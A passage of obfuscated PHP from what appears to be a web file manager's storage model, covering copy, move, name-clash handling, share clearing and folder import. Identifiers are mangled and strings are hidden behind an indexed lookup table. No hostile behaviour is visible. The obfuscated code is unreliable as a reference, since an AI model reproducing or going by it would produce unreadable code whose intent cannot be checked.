$½ÔûÊÊ¢; } private function _copy($†ÀÇŞùë, $É¶… Û¯, $ÒÂÁÌôß, &$õĞ×±‰±, $šâöÉüÅ, $š‘­µæä = '') { $Ü—ÜâÚ =& $_SERVER[´‹ô¯Œ]; $ŒÚ¹ıŒó = $this->sourceInfoCache($†ÀÇŞùë); $£¢ëŸ¤‚ = $ŒÚ¹ıŒó[$Ü—ÜâÚ[497]] == $Ü—ÜâÚ[91]; $¿Íúñäã = $š‘­µæä ? $š‘­µæä : $ŒÚ¹ıŒó[$Ü—ÜâÚ[32]]; $¨ú¥Î» = $this->fileNameExistAuto($É¶… Û¯, $ŒÚ¹ıŒó); if ($šâöÉüÅ) { $this->_childrenAllMake($†ÀÇŞùë); if ($£¢ëŸ¤‚ && $¨ú¥Î») { $this->_childrenAllMake($¨ú¥Î»); } } if (!$¨ú¥Î») { return $this->_copyCreate($†ÀÇŞùë, $É¶… Û¯, $¿Íúñäã, $õĞ×±‰±); } $–ÆŠÉŠ = $¨ú¥Î»; if ($£¢ëŸ¤‚) { if ($ÒÂÁÌôß == REPEAT_RENAME_FOLDER) { $¿Íúñäã = $this->fileNameAutoCache($É¶… Û¯, $¿Íúñäã, $ÒÂÁÌôß, $£¢ëŸ¤‚); $–ÆŠÉŠ = $this->_copyCreate($†ÀÇŞùë, $É¶… Û¯, $¿Íúñäã, $õĞ×±‰±); } else { $¸ç…ûÕ» = $this->_childrenList($†ÀÇŞùë); foreach ($¸ç…ûÕ» as $—şªÙ·) { $this->_copy($—şªÙ·[$Ü—ÜâÚ[194]], $¨ú¥Î», $ÒÂÁÌôß, $õĞ×±‰±, !1); } } } else { if ($ÒÂÁÌôß == REPEAT_RENAME || $ÒÂÁÌôß == REPEAT_RENAME_FOLDER) { $¿Íúñäã = $this->fileNameAutoCache($É¶… Û¯, $¿Íúñäã, $ÒÂÁÌôß, $£¢ëŸ¤‚); $–ÆŠÉŠ = $this->_copyCreate($†ÀÇŞùë, $É¶… Û¯, $¿Íúñäã, $õĞ×±‰±); } else { if ($ÒÂÁÌôß == REPEAT_REPLACE) { $ÅóğÊÛ² = $this->sourceInfoCache($¨ú¥Î»); $¥õ§›Ğ’ = $this->fileHistory($ÅóğÊÛ², $ŒÚ¹ıŒó[$Ü—ÜâÚ[555]], $ŒÚ¹ıŒó[$Ü—ÜâÚ[79]]); if ($¥õ§›Ğ’) { $õĞ×±‰±[$Ü—ÜâÚ[646]][] = $ŒÚ¹ıŒó[$Ü—ÜâÚ[555]]; } } else { if ($ÒÂÁÌôß == REPEAT_SKIP) { } } } Hook::trigger($Ü—ÜâÚ[651], array($Ü—ÜâÚ[652], $ŒÚ¹ıŒó, 0)); } return $–ÆŠÉŠ; } private function _copyCreate($Œ¿ÈîÀÆ, $°¾àé, $Åœ§ÀĞ‡, &$öÌ÷Ğ©ê) { $µ––€æ® =& $_SERVER[´‹ô¯Œ]; $ßœª¢‹À = $this->sourceInfoCache($Œ¿ÈîÀÆ); $š€ôÖ = $this->sourceInfoCache($°¾àé); $ö÷Ô¤ĞÒ = $this->_makeItemData($ßœª¢‹À, $š€ôÖ, $Åœ§ÀĞ‡); Hook::trigger($µ––€æ®[653], $ö÷Ô¤ĞÒ); Hook::trigger($µ––€æ®[654], array($µ––€æ®[655], $ö÷Ô¤ĞÒ, 0)); $õ¬öåœ = $this->add($ö÷Ô¤ĞÒ); $ÚéÅ¶ú– = array($µ––€æ®[194] => $õ¬öåœ, $µ––€æ®[32] => $Åœ§ÀĞ‡); $this->_copyApplyMeta($ÚéÅ¶ú–, $öÌ÷Ğ©ê); if ($ßœª¢‹À[$µ––€æ®[497]] != $µ––€æ®[91]) { $öÌ÷Ğ©ê[$µ––€æ®[646]][] = $ßœª¢‹À[$µ––€æ®[555]]; return $õ¬öåœ; } $ëœóêŠâ = array(); $¡«æã’Ê = array(); $this->_childrenListAll($Œ¿ÈîÀÆ, $ëœóêŠâ); $Ä²Ä½ÙÈ = count($ëœóêŠâ); if ($Ä²Ä½ÙÈ == 0) { return $õ¬öåœ; } $›»¤‹‚¼ = $this->sourceInfo($õ¬öåœ); foreach ($ëœóêŠâ as $²öŒ„À) { $ËùÓßÔå = $this->_makeItemData($²öŒ„À, $›»¤‹‚¼, $²öŒ„À[$µ––€æ®[32]]); $ËùÓßÔå[$µ––€æ®[598]] = $²öŒ„À[$µ––€æ®[598]]; $¡«æã’Ê[] = $ËùÓßÔå; } $this->chunkEventSet($µ––€æ®[656], array($µ––€æ®[657], $ö÷Ô¤ĞÒ, $Ä²Ä½ÙÈ)); $this->addAll($¡«æã’Ê, array(), !1); $Óú®ãä = $this->where(array($µ––€æ®[193] => $õ¬öåœ))->select(); $Š¢Ô›¡“ = $this->_childrenMakeRelation($ëœóêŠâ, $Óú®ãä); $Š¢Ô›¡“[$Œ¿ÈîÀÆ] = $õ¬öåœ; $À›È¦ÔÒ = array(); $æ•­¼—ä = array(); foreach ($Óú®ãä as $²öŒ„À) { $â°›”à· = $²öŒ„À[$µ––€æ®[194]]; $Ø‰ˆÈ°Ù = $this->_childrenMatch($Š¢Ô›¡“, $²öŒ„À, $›»¤‹‚¼); $À›È¦ÔÒ[] = array($µ––€æ®[194], $â°›”à·, $µ––€æ®[193], $Ø‰ˆÈ°Ù[$µ––€æ®[193]]); $æ•­¼—ä[] = array($µ––€æ®[194], $â°›”à·, $µ––€æ®[598], $Ø‰ˆÈ°Ù[$µ––€æ®[598]]); $this->_copyApplyMeta($²öŒ„À, $öÌ÷Ğ©ê); if ($²öŒ„À[$µ––€æ®[497]] != $µ––€æ®[91]) { $öÌ÷Ğ©ê[$µ––€æ®[646]][] = $²öŒ„À[$µ––€æ®[555]]; } } $this->chunkEventSet($µ––€æ®[658], array($µ––€æ®[659], $ö÷Ô¤ĞÒ, $Ä²Ä½ÙÈ)); $this->saveAll($À›È¦ÔÒ); $this->chunkEventSet($µ––€æ®[660], array($µ––€æ®[661], $ö÷Ô¤ĞÒ, $Ä²Ä½ÙÈ)); $this->saveAll($æ•­¼—ä); return $õ¬öåœ; } private function _childrenMakeRelation($£¦­§ÍŞ, $´†Àê›Ä) { $É®‰Ë×  =& $_SERVER[´‹ô¯Œ]; $øÎ´´‡ç = array(); $öşÕ½Õˆ = array(); foreach ($£¦­§ÍŞ as $Ôş½ÄÔ¥) { $€Ù¦Şä¾ = $Ôş½ÄÔ¥[$É®‰Ë× [32]] . $É®‰Ë× [8] . $Ôş½ÄÔ¥[$É®‰Ë× [598]]; $øÎ´´‡ç[$€Ù¦Şä¾] = $Ôş½ÄÔ¥[$É®‰Ë× [194]]; } foreach ($´†Àê›Ä as $Ôş½ÄÔ¥) { $€Ù¦Şä¾ = $Ôş½ÄÔ¥[$É®‰Ë× [32]] . $É®‰Ë× [8] . $Ôş½ÄÔ¥[$É®‰Ë× [598]]; $Ï¹Ïš§Í = $øÎ´´‡ç[$€Ù¦Şä¾]; $öşÕ½Õˆ[$Ï¹Ïš§Í] = $Ôş½ÄÔ¥[$É®‰Ë× [194]]; } return $öşÕ½Õˆ; } private function _childrenMatch($¦Ó§È•ë, $»”ÛÕã, $Ğª¸ˆîå) { $ïÃøïó¿ =& $_SERVER[´‹ô¯Œ]; $ÚÌŸ—€³ = $Ğª¸ˆîå[$ïÃøïó¿[598]]; $¡–ê‰÷ç = $this->parentLevelArray($»”ÛÕã[$ïÃøïó¿[598]]); foreach ($¡–ê‰÷ç as $ß¶™µ€£) { if (isset($¦Ó§È•ë[$ß¶™µ€£])) { $ÚÌŸ—€³ .= $¦Ó§È•ë[$ß¶™µ€£] . $ïÃøïó¿[662]; } } $ÚÌŸ—€³ = rtrim($ÚÌŸ—€³, $ïÃøïó¿[50]) . $ïÃøïó¿[50]; $å‡¹Û–¾ = $this->parentLevelArray($ÚÌŸ—€³); $ªá¥îÀ­ = $å‡¹Û–¾[count($å‡¹Û–¾) - 1]; return array($ïÃøïó¿[193] => $ªá¥îÀ­, $ïÃøïó¿[598] => $ÚÌŸ—€³); } private function _makeItemData($æüÌ—, $õ¼Ğœ¾Ò, $ÀüÍ©¢’) { $É¥õ…µ÷ =& $_SERVER[´‹ô¯Œ]; $Ş÷Ö÷·Í = array($É¥õ…µ÷[663] => $æüÌ—[$É¥õ…µ÷[497]], $É¥õ…µ÷[506] => $ÀüÍ©¢’, $É¥õ…µ÷[664] => $æüÌ—[$É¥õ…µ÷[498]] ? $æüÌ—[$É¥õ…µ÷[498]] : $É¥õ…µ÷[12], $É¥õ…µ÷[556] => $æüÌ—[$É¥õ…µ÷[555]] ? $æüÌ—[$É¥õ…µ÷[555]] : 0, $É¥õ…µ÷[634] => $æüÌ—[$É¥õ…µ÷[79]] ? $æüÌ—[$É¥õ…µ÷[79]] : 0, $É¥õ…µ÷[665] => intval($õ¼Ğœ¾Ò[$É¥õ…µ÷[191]]), $É¥õ…µ÷[666] => intval($õ¼Ğœ¾Ò[$É¥õ…µ÷[583]]), $É¥õ…µ÷[667] => intval(USER_ID), $É¥õ…µ÷[668] => intval(USER_ID), $É¥õ…µ÷[489] => intval($õ¼Ğœ¾Ò[$É¥õ…µ÷[194]]), $É¥õ…µ÷[669] => $õ¼Ğœ¾Ò[$É¥õ…µ÷[598]] . $õ¼Ğœ¾Ò[$É¥õ…µ÷[194]] . $É¥õ…µ÷[50], $É¥õ…µ÷[510] => $æüÌ—[$É¥õ…µ÷[88]] ? $æüÌ—[$É¥õ…µ÷[88]] : time(), $É¥õ…µ÷[516] => 0, $É¥õ…µ÷[670] => $É¥õ…µ÷[12]); return $Ş÷Ö÷·Í; } private function _copyApplyMeta($‚¹çß‚£, &$ƒÛ’ıê) { $‡±¬øÛ° =& $_SERVER[´‹ô¯Œ]; $®‘íˆ½Õ = $‚¹çß‚£[$‡±¬øÛ°[194]]; $³÷—ËÍô = $‚¹çß‚£[$‡±¬øÛ°[32]]; if (!isset($‚¹çß‚£[$‡±¬øÛ°[671]]) || !$‚¹çß‚£[$‡±¬øÛ°[671]] || $‚¹çß‚£[$‡±¬øÛ°[671]] == $‡±¬øÛ°[231]) { $ƒÛ’ıê[$‡±¬øÛ°[648]][] = array($‡±¬øÛ°[194], $®‘íˆ½Õ, $‡±¬øÛ°[671], short_id($®‘íˆ½Õ)); } if (Input::check($³÷—ËÍô, $‡±¬øÛ°[672])) { $ƒÛ’ıê[$‡±¬øÛ°[647]][] = array($‡±¬øÛ°[194] => $®‘íˆ½Õ, $‡±¬øÛ°[97] => $‡±¬øÛ°[550], $‡±¬øÛ°[453] => str_replace($‡±¬øÛ°[53], $‡±¬øÛ°[12], Pinyin::get($³÷—ËÍô))); $ƒÛ’ıê[$‡±¬øÛ°[647]][] = array($‡±¬øÛ°[194] => $®‘íˆ½Õ, $‡±¬øÛ°[97] => $‡±¬øÛ°[549], $‡±¬øÛ°[453] => Pinyin::get($³÷—ËÍô, $‡±¬øÛ°[673])); } $ƒÛ’ıê[$‡±¬øÛ°[647]][] = array($‡±¬øÛ°[194] => $®‘íˆ½Õ, $‡±¬øÛ°[97] => $‡±¬øÛ°[529], $‡±¬øÛ°[453] => KodSort::makeStr($³÷—ËÍô)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($ğ”˜¬Ö¥) { $–»ÙºÑ =& $_SERVER[´‹ô¯Œ]; $ÚìÌîšŒ = $this->sourceInfo($ğ”˜¬Ö¥); $¥ÚÚê» = $–»ÙºÑ[674]; $¨È½òÄç = array($–»ÙºÑ[598] => array($–»ÙºÑ[629], $ÚìÌîšŒ[$–»ÙºÑ[598]] . $ğ”˜¬Ö¥ . $–»ÙºÑ[630]), $–»ÙºÑ[517] => $this->targetIsDelete); $§ªìº“ = $this->field($¥ÚÚê»)->where($¨È½òÄç)->select(); if (!$§ªìº“) { return; } $§ªìº“ = array_to_keyvalue($§ªìº“, $–»ÙºÑ[194]); foreach ($§ªìº“ as $œ’…ß‚) { $ü¢‘¨¯å = $œ’…ß‚[$–»ÙºÑ[193]]; $ğ”˜¬Ö¥ = $œ’…ß‚[$–»ÙºÑ[194]]; if (!isset($this->_childrenListCache[$ğ”˜¬Ö¥]) && $œ’…ß‚[$–»ÙºÑ[497]] == $–»ÙºÑ[91]) { $this->_childrenListCache[$ğ”˜¬Ö¥] = array(); } if (!isset($this->_childrenListCache[$ü¢‘¨¯å])) { $this->_childrenListCache[$ü¢‘¨¯å] = array(); } $this->_childrenListCache[$ü¢‘¨¯å][$ğ”˜¬Ö¥] = $œ’…ß‚; $this->_childrenItemCache[$ğ”˜¬Ö¥] = $œ’…ß‚; } } private function _childrenListAll($Ê‹Ÿüá¸, &$‰á‰Ñó‚) { $¸‹ä—Š¨ =& $_SERVER[´‹ô¯Œ]; if (!isset($this->_childrenListCache[$Ê‹Ÿüá¸])) { return; } $ğ•ƒø”¡ = $this->_childrenListCache[$Ê‹Ÿüá¸]; foreach ($ğ•ƒø”¡ as $Šçäåá => $‡é–ÖÏ) { $‰á‰Ñó‚[$Šçäåá] = $‡é–ÖÏ; if ($‡é–ÖÏ[$¸‹ä—Š¨[497]] == $¸‹ä—Š¨[91]) { $this->_childrenListAll($Šçäåá, $‰á‰Ñó‚); } } } private function sourceInfoCache($ÄÔ©Ø¶) { if (isset($this->_childrenItemCache[$ÄÔ©Ø¶])) { return $this->_childrenItemCache[$ÄÔ©Ø¶]; } return $this->sourceInfo($ÄÔ©Ø¶); } private function _childrenList($—çúûôÔ) { if (isset($this->_childrenListCache[$—çúûôÔ])) { return $this->_childrenListCache[$—çúûôÔ]; } return $this->_childrenListSelect($—çúûôÔ); } private function _childrenListSelect($óÑ–¹) { $İ €”ÒŞ =& $_SERVER[´‹ô¯Œ]; $°š¿Ñ = array($İ €”ÒŞ[193] => $óÑ–¹, $İ €”ÒŞ[517] => $this->targetIsDelete); $á‘‚îè’ = $this->where($°š¿Ñ)->select(); $á‘‚îè’ = $á‘‚îè’ ? $á‘‚îè’ : array(); $¯¾°›Ÿ = array_to_keyvalue($á‘‚îè’, $İ €”ÒŞ[194]); $this->_childrenListCache[$óÑ–¹] = $¯¾°›Ÿ; foreach ($¯¾°›Ÿ as $óÑ–¹ => $Œ¤æÕÜÕ) { $this->_childrenItemCache[$óÑ–¹] = $Œ¤æÕÜÕ; } return $¯¾°›Ÿ; } private function fileNameExistAuto($­—Ôå—, $¶²ù‹Ãı) { $Ï—àÉ½ô =& $_SERVER[´‹ô¯Œ]; if ($¶²ù‹Ãı[$Ï—àÉ½ô[517]] == $Ï—àÉ½ô[91]) { return $this->fileNameExist($­—Ôå—, $¶²ù‹Ãı[$Ï—àÉ½ô[32]]); } return $this->fileNameExistCache($­—Ôå—, $¶²ù‹Ãı[$Ï—àÉ½ô[32]]); } private function fileNameExistCache($ø‚‡“ş², $ü·•‰˜³) { $œë„’¤” =& $_SERVER[´‹ô¯Œ]; $ü·•‰˜³ = strtolower($ü·•‰˜³); $ÂáœßÓù = $this->_childrenList($ø‚‡“ş²); foreach ($ÂáœßÓù as $Û”ê ) { if ($ü·•‰˜³ == strtolower($Û”ê [$œë„’¤”[32]])) { return $Û”ê [$œë„’¤”[194]]; } } return !1; } private function fileNameAutoCache($Ä·¯³ú€, $æ¨¥ëà¦, $ª£™ÇõÔ, $¬Çâéüç) { $—İáüËÄ =& $_SERVER[´‹ô¯Œ]; $§»ô¢”û = $this->_childrenList($Ä·¯³ú€); $çé‚°¼ñ = array_to_keyvalue($§»ô¢”û, $—İáüËÄ[12], $—İáüËÄ[32]); return $this->fileNameAutoGet($çé‚°¼ñ, $æ¨¥ëà¦, $ª£™ÇõÔ, $¬Çâéüç); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($ÙÒ±ß¡, $êĞ‰´®é, $éˆß­İë = REPEAT_REPLACE, $Ì¹Åñ˜Æ = '') { $”Úï =& $_SERVER[´‹ô¯Œ]; $òàš–éö = $this->sourceInfo($ÙÒ±ß¡); $ëë¿ø±Š = $this->sourceInfo($êĞ‰´®é); if ($òàš–éö[$”Úï[193]] == $ëë¿ø±Š[$”Úï[194]]) { if ($òàš–éö[$”Úï[517]] == $”Úï[91]) { Model($”Úï[515])->restore(array($ÙÒ±ß¡)); } if (!$Ì¹Åñ˜Æ || $Ì¹Åñ˜Æ == $òàš–éö[$”Úï[32]]) { return $ÙÒ±ß¡; } } $ÃÃÎöÈ± = $this->pathInfoMore($ÙÒ±ß¡); if ($this->isParentOf($ÙÒ±ß¡, $êĞ‰´®é)) { return !1; } if (!$òàš–éö || !$ëë¿ø±Š || $ëë¿ø±Š[$”Úï[497]] != $”Úï[91]) { return !1; } Hook::trigger($”Úï[675], $ÃÃÎöÈ±); $this->targetIsDelete = intval($òàš–éö[$”Úï[517]]); if ($òàš–éö[$”Úï[193]] == $êĞ‰´®é && $Ì¹Åñ˜Æ != $òàš–éö[$”Úï[32]]) { $§“í—è = $this->fileNameExist($êĞ‰´®é, $Ì¹Åñ˜Æ); if ($§“í—è && $òàš–éö[$”Úï[497]] == $”Úï[231]) { $³˜ñÒ¿˜ = $this->sourceInfo($§“í—è); $É“Ñéõ = $this->fileHistory($³˜ñÒ¿˜, $òàš–éö[$”Úï[555]], $òàš–éö[$”Úï[79]]); if (!$É“Ñéõ) { Model($”Úï[558])->remove($òàš–éö[$”Úï[555]]); } $this->removeNow($ÙÒ±ß¡, !1); $this->folderSizeReset($êĞ‰´®é); Hook::trigger($”Úï[676], $ÃÃÎöÈ±); return $§“í—è; } } $Ö¬Ï¥¾Ó = $Ì¹Åñ˜Æ ? $Ì¹Åñ˜Æ : $òàš–éö[$”Úï[32]]; $this->lockMoveStart($ÙÒ±ß¡); $this->lockWriteStart($êĞ‰´®é, $Ö¬Ï¥¾Ó); $·™­íÀÅ = array($”Úï[646] => array(), $”Úï[677] => !1); $this->clearShare($ÙÒ±ß¡, $êĞ‰´®é); $ĞÛİú”Ø = $this->fileNameExistAuto($êĞ‰´®é, $òàš–éö); $ğğŞ = $this->_move($ÙÒ±ß¡, $êĞ‰´®é, $éˆß­İë, $·™­íÀÅ, $Ì¹Åñ˜Æ); $this->sourceCacheClear(); if ($òàš–éö[$”Úï[497]] == $”Úï[91] && $ĞÛİú”Ø) { $this->folderSizeResetChildren($ğğŞ); } Model($”Úï[233])->linkAdd($·™­íÀÅ[$”Úï[646]]); if ($ğğŞ && $ĞÛİú”Ø && $·™­íÀÅ[$”Úï[677]]) { $Ú§ı¾– = $òàš–éö[$”Úï[497]] == $”Úï[91] ? $this->_childrenListSelect($ÙÒ±ß¡) : !1; $ì Ÿ¤³” = $Ú§ı¾– && count($Ú§ı¾–) > 0 ? !0 : !1; $this->removeNow($ÙÒ±ß¡, $ì Ÿ¤³”); } $this->lockMoveEnd($ÙÒ±ß¡); $this->lockWriteEnd($êĞ‰´®é, $Ö¬Ï¥¾Ó); $this->folderSizeReset($òàš–éö[$”Úï[193]]); $this->folderSizeReset($êĞ‰´®é); $¦Ï‘¹¹ = array($òàš–éö[$”Úï[193]], $êĞ‰´®é); if ($òàš–éö[$”Úï[497]] == $”Úï[91]) { $¦Ï‘¹¹[] = $ÙÒ±ß¡; } $this->updateModifyTime($¦Ï‘¹¹); Model($”Úï[650])->eventMove($ÙÒ±ß¡, $òàš–éö[$”Úï[193]], $êĞ‰´®é); Hook::trigger($”Úï[676], $ÃÃÎöÈ±); return $ğğŞ; } private function _move($ßŸˆš‚İ, $×Àû¼, $×¡„Õ–…, &$Â³öÍœğ, $®¸Ö‚Â = '') { $”ïáÈêø =& $_SERVER[´‹ô¯Œ]; $™«çĞª× = $this->sourceInfo($ßŸˆš‚İ); $ç½Üù‚ = $™«çĞª×[$”ïáÈêø[497]] == $”ïáÈêø[91]; $ˆµƒÄÉ = $®¸Ö‚Â ? $®¸Ö‚Â : $™«çĞª×[$”ïáÈêø[32]]; $‘£ó”ÀÊ = $this->fileNameExistAuto($×Àû¼, $™«çĞª×); $this->lockMoveStart($ßŸˆš‚İ); $this->lockWriteStart($×Àû¼, $ˆµƒÄÉ); if (!$‘£ó”ÀÊ) { return $this->_moveForce($ßŸˆš‚İ, $×Àû¼, $ˆµƒÄÉ); } $“µÕšà— = $‘£ó”ÀÊ; $»ìÂó»€ = !1; if ($ç½Üù‚) { if ($×¡„Õ–… == REPEAT_RENAME_FOLDER) { $ˆµƒÄÉ = $this->fileNameAuto($×Àû¼, $ˆµƒÄÉ, $×¡„Õ–…, $ç½Üù‚); $“µÕšà— = $this->_moveForce($ßŸˆš‚İ, $×Àû¼, $ˆµƒÄÉ); } else { $ß¯°Ì°Ó = $this->_childrenListSelect($ßŸˆš‚İ); foreach ($ß¯°Ì°Ó as $ÆÍ—Å¨é) { $ŸÚ™á´è = REPEAT_REPLACE; $this->_move($ÆÍ—Å¨é[$”ïáÈêø[194]], $‘£ó”ÀÊ, $ŸÚ™á´è, $Â³öÍœğ); } $»ìÂó»€ = !0; } } else { if ($×¡„Õ–… == REPEAT_RENAME || $×¡„Õ–… == REPEAT_RENAME_FOLDER) { $ˆµƒÄÉ = $this->fileNameAuto($×Àû¼, $ˆµƒÄÉ, $×¡„Õ–…, $ç½Üù‚); $“µÕšà— = $this->_moveForce($ßŸˆš‚İ, $×Àû¼, $ˆµƒÄÉ); } else { $ûê˜åÂâ = $this->sourceInfoCache($‘£ó”ÀÊ); $ŸŸÍÉâÜ = $this->fileHistory($ûê˜åÂâ, $™«çĞª×[$”ïáÈêø[555]], $™«çĞª×[$”ïáÈêø[79]]); if ($ŸŸÍÉâÜ) { $Â³öÍœğ[$”ïáÈêø[646]][] = $™«çĞª×[$”ïáÈêø[555]]; } $»ìÂó»€ = !0; } } if ($»ìÂó»€) { $Â³öÍœğ[$”ïáÈêø[677]] = !0; } return $“µÕšà—; } private function _moveForce($»“æ‚ƒ¦, $¤ñ›¹¯ø, $Âú›ªÚ›) { $‚©Şø·Ç =& $_SERVER[´‹ô¯Œ]; $«Ü§ £‡ = $this->sourceInfo($»“æ‚ƒ¦); $Æõ¾Æ¶ê = $this->sourceInfo($¤ñ›¹¯ø); $ÁğşÙã± = $«Ü§ £‡[$‚©Şø·Ç[497]] == $‚©Şø·Ç[91]; $²³‰†Ó = array($‚©Şø·Ç[489] => $Æõ¾Æ¶ê[$‚©Şø·Ç[194]], $‚©Şø·Ç[669] => $Æõ¾Æ¶ê[$‚©Şø·Ç[598]] . $Æõ¾Æ¶ê[$‚©Şø·Ç[194]] . $‚©Şø·Ç[50], $‚©Şø·Ç[665] => $Æõ¾Æ¶ê[$‚©Şø·Ç[191]], $‚©Şø·Ç[666] => $Æõ¾Æ¶ê[$‚©Şø·Ç[583]], $‚©Şø·Ç[668] => USER_ID, $‚©Şø·Ç[506] => $Âú›ªÚ›); $¦”‡®­ = $«Ü§ £‡[$‚©Şø·Ç[191]] == SourceModel::TYPE_GROUP && $Æõ¾Æ¶ê[$‚©Şø·Ç[191]] == SourceModel::TYPE_GROUP && $«Ü§ £‡[$‚©Şø·Ç[583]] == $Æõ¾Æ¶ê[$‚©Şø·Ç[583]]; if (!$¦”‡®­ && $this->moveClearAuth) { Model($‚©Şø·Ç[581])->authClear($»“æ‚ƒ¦); } $Ûª¾íˆÁ = $«Ü§ £‡[$‚©Şø·Ç[517]] == $‚©Şø·Ç[91] && $Æõ¾Æ¶ê[$‚©Şø·Ç[517]] != $‚©Şø·Ç[91]; if ($Ûª¾íˆÁ) { $²³‰†Ó[$‚©Şø·Ç[516]] = 0; } if ($ÁğşÙã±) { $Îü¶ş¤İ = array($‚©Şø·Ç[669] => array($‚©Şø·Ç[629], $«Ü§ £‡[$‚©Şø·Ç[598]] . $«Ü§ £‡[$‚©Şø·Ç[194]] . $‚©Şø·Ç[630])); $µÜ¿Ëêˆ = $«Ü§ £‡[$‚©Şø·Ç[598]] . $«Ü§ £‡[$‚©Şø·Ç[194]] . $‚©Şø·Ç[50]; $ÔßÃÒ‰Ş = $Æõ¾Æ¶ê[$‚©Şø·Ç[598]] . $Æõ¾Æ¶ê[$‚©Şø·Ç[194]] . $‚©Şø·Ç[50] . $«Ü§ £‡[$‚©Şø·Ç[194]] . $‚©Şø·Ç[50]; $´£öÅ¼Ğ = array($‚©Şø·Ç[669] => array($‚©Şø·Ç[678], "\x72\145\x70\154\x61\143\x65\x28\160\141\162\145\156\164\114\145\166\x65\x6c\54\47{$µÜ¿Ëêˆ}\x27\x2c\x27{$ÔßÃÒ‰Ş}\47\x29"), $‚©Şø·Ç[665] => $Æõ¾Æ¶ê[$‚©Şø·Ç[191]], $‚©Şø·Ç[666] => $Æõ¾Æ¶ê[$‚©Şø·Ç[583]]); if ($Ûª¾íˆÁ) { $´£öÅ¼Ğ[$‚©Şø·Ç[516]] = 0; } $this->where($Îü¶ş¤İ)->data($´£öÅ¼Ğ)->save(); } $this->where(array($‚©Şø·Ç[503] => $»“æ‚ƒ¦))->data($²³‰†Ó)->save(); return $»“æ‚ƒ¦; } private function clearShare($±¼¯Ÿ¿®, $÷ÈŒ¥¾) { $ş‘ÕİÌí =& $_SERVER[´‹ô¯Œ]; $•Êö³† = $this->sourceInfo($±¼¯Ÿ¿®); $•‡”Ô­¸ = $this->sourceInfo($÷ÈŒ¥¾); if ($•Êö³†[$ş‘ÕİÌí[583]] == $•‡”Ô­¸[$ş‘ÕİÌí[583]] && $•Êö³†[$ş‘ÕİÌí[191]] == $ş‘ÕİÌí[679]) { return; } $„³ø¨®¾ = array($ş‘ÕİÌí[598] => array($ş‘ÕİÌí[629], $•Êö³†[$ş‘ÕİÌí[598]] . $±¼¯Ÿ¿® . $ş‘ÕİÌí[630])); $ŸÖœÆç½ = $this->field($ş‘ÕİÌí[503])->where($„³ø¨®¾)->getField($ş‘ÕİÌí[194], !0); if (!$ŸÖœÆç½) { return; } $„³ø¨®¾ = array($ş‘ÕİÌí[194] => array($ş‘ÕİÌí[7], $ŸÖœÆç½), $ş‘ÕİÌí[680] => 1); $¤šË‡âÊ = Model($ş‘ÕİÌí[681])->field($ş‘ÕİÌí[682])->where($„³ø¨®¾)->select(); if (!$¤šË‡âÊ) { return; } $¤šË‡âÊ = array_to_keyvalue($¤šË‡âÊ, $ş‘ÕİÌí[12], $ş‘ÕİÌí[682]); $„³ø¨®¾ = array($ş‘ÕİÌí[682] => array($ş‘ÕİÌí[7], $¤šË‡âÊ)); Model($ş‘ÕİÌí[681])->where($„³ø¨®¾)->save(array($ş‘ÕİÌí[680] => 0)); Model($ş‘ÕİÌí[683])->where($„³ø¨®¾)->delete(); } public function copyFolderFromIO($ŒŞÓÎÈª, $ï©òİÇ”, $¹³“Ğı¥, $·ë–À´, $ºÃ×òåÍ, $Š…úá¤§ = false) { $ÆšÈïÙü =& $_SERVER[´‹ô¯Œ]; $·Öğ‰¹â = array($ÆšÈïÙü[647] => array(), $ÆšÈïÙü[648] => array(), $ÆšÈïÙü[646] => array(), $ÆšÈïÙü[684] => array()); $©Áºöó = $Š…úá¤§ ? $Š…úá¤§ : $ŒŞÓÎÈª->pathThis($ï©òİÇ”); $İÑÙô¡Š = $this->fileNameExist($¹³“Ğı¥, $©Áºöó); $ÊÏªÁå› = $this->mkdir($¹³“Ğı¥, $©Áºöó, $·ë–À´); if (!$İÑÙô¡Š || $·ë–À´ == REPEAT_RENAME_FOLDER) { $·ë–À´ = !1; } if ($İÑÙô¡Š) { $this->_childrenAllMake($İÑÙô¡Š); } Hook::trigger($ÆšÈïÙü[685]); $¸øÏÇŠ˜ = KodIO::ioFileDriverGet($ÆšÈïÙü[495] . $¹³“Ğı¥ . $ÆšÈïÙü[405]); $this->_copyChildTo($ŒŞÓÎÈª, $ï©òİÇ”, $ÊÏªÁå›, $·ë–À´, $·Öğ‰¹â, $ºÃ×òåÍ, $¸øÏÇŠ˜); Hook::trigger($ÆšÈïÙü[686]); if ($ÊÏªÁå›) { $this->folderSizeResetChildren($ÊÏªÁå›); } $this->_childrenListClear(); Model($ÆšÈïÙü[649])->addAll($·Öğ‰¹â[$ÆšÈïÙü[647]], array(), !0); Model($ÆšÈïÙü[650])->eventCopy($ÊÏªÁå›); $this->saveAll($·Öğ‰¹â[$ÆšÈïÙü[648]]); Model($ÆšÈïÙü[558])->linkAdd($·Öğ‰¹â[$ÆšÈïÙü[646]]); Model($ÆšÈïÙü[558])->remove($·Öğ‰¹â[$ÆšÈïÙü[684]]); $this->folderSizeReset($¹³“Ğı¥); $this->updateModifyTime($¹³“Ğı¥); return $ÊÏªÁå›; } private function _copyChildTo($Á×•Ó¹, $‘Õ˜È—, $­îúâŒ, $¶±ÆÀßå, &$ì¶ê®µ, $Á›†¿­Ö, $À»íä„Ğ) { $â«ÖÇõ± =& $_SERVER[´‹ô¯Œ]; $ìĞÕÜÃÜ = $this->sourceInfoCache($­îúâŒ); $Ü¶¥äÇŸ = $Á×•Ó¹->listPath($‘Õ˜È—); $Ü¶¥äÇŸ = $Ü¶¥äÇŸ ? $Ü¶¥äÇŸ : array($â«ÖÇõ±[86] => array(), $â«ÖÇõ±[85] => array()); $ñ±İÕûí = array_merge($Ü¶¥äÇŸ[$â«ÖÇõ±[86]], $Ü¶¥äÇŸ[$â«ÖÇõ±[85]]); $ÉìÒ¶ğ = $this->_addFiles($Á×•Ó¹, $À»íä„Ğ, $Ü¶¥äÇŸ[$â«ÖÇõ±[86]], $Á›†¿­Ö); $ÅŒ²Ú¤È = array(); foreach ($ñ±İÕûí as &$÷Ó·«æ­) { if (isset($ÉìÒ¶ğ[$÷Ó·«æ­[$â«ÖÇõ±[32]]])) { $÷Ó·«æ­ = $ÉìÒ¶ğ[$÷Ó·«æ­[$â«ÖÇõ±[32]]]; } $÷Ó·«æ­[$â«ÖÇõ±[497]] = 